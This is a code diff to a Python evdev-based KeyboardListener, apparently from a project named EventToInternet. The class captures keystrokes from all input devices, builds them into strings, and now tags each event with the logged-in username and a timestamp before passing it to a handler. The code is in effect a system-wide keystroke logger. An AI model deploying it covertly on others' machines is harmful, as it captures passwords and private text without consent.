@@ -1,5 +1,7 @@
 import asyncio
 import evdev
+from getpass import getuser
+from datetime import datetime
 from EventToInternet import _config_event_to_string, KEYBOARD_MAX_STRING_LENGTH, KEYBOARD_UPDATE_DEVICES_TIMEOUT
 
 
@@ -9,7 +11,9 @@ class KeyboardListener:
                  capital_letters_codes=_config_event_to_string.capital_letters_codes.copy(),
                  capital_symbols_codes=_config_event_to_string.capital_symbols_codes.copy(),
                  numpad_symbols_codes=_config_event_to_string.numpad_symbols_codes.copy(),
-                 split_keys=_config_event_to_string.split_keys.copy()):
+                 split_keys=_config_event_to_string.split_keys.copy(),
+                 capitalize_all_keys=_config_event_to_string.capitalize_all_keys.copy(),
+                 capitalize_symbols_turn_keys=_config_event_to_string.capitalize_symbols_turn_keys.copy()):
         self.event_devices = map(evdev.InputDevice, evdev.list_devices())
         self.event_devices = {dev.path: dev for dev in self.event_devices}
         self.memory_devices = {}
@@ -19,6 +23,8 @@ class KeyboardListener:
         self.capital_symbols_codes = capital_symbols_codes
         self.numpad_symbols_codes = numpad_symbols_codes
         self.split_keys = split_keys
+        self.capitalize_all_keys = capitalize_all_keys
+        self.capitalize_symbols_turn_keys = capitalize_symbols_turn_keys
         asyncio.ensure_future(self.__update_devices())
         for device in self.event_devices.values():
             asyncio.ensure_future(self.__get_keyboard_events(device))
@@ -70,6 +76,8 @@ class KeyboardListener:
                 json_event = {
                     'string': self.memory_devices[device.path]["string"],
                     'name': device.name,
+                    'timestamp': datetime.timestamp(datetime.now()),
+                    'user': getuser(),
                     'info': {
                         'phys': device.phys,
                         'path': device.path,
@@ -83,16 +91,13 @@ class KeyboardListener:
                 await self.dict_handler(json_event)
                 self.memory_devices[device.path]["string"] = ""
             return
-        if category.scancode == evdev.ecodes.KEY_LEFTSHIFT \
-                or category.scancode == evdev.ecodes.KEY_RIGHTSHIFT:
-            if category.keystate == category.key_down \
-                    or category.keystate == category.key_up:
+        if category.keycode in self.capitalize_all_keys:
+            if category.keystate == category.key_down or category.keystate == category.key_up:
                 self.memory_devices[device.path]["is_capital_letters"] = not self.memory_devices[
                     device.path]["is_capital_letters"]
                 self.memory_devices[device.path]["is_capital_symbols"] = not self.memory_devices[
                     device.path]["is_capital_symbols"]
-        if category.scancode == evdev.ecodes.KEY_CAPSLOCK \
-                and category.keystate == category.key_down:
+        elif category.keycode in self.capitalize_symbols_turn_keys and category.keystate == category.key_down:
             self.memory_devices[device.path]["is_capital_letters"] = not self.memory_devices[
                 device.path]["is_capital_letters"]
         if category.keystate != category.key_down:
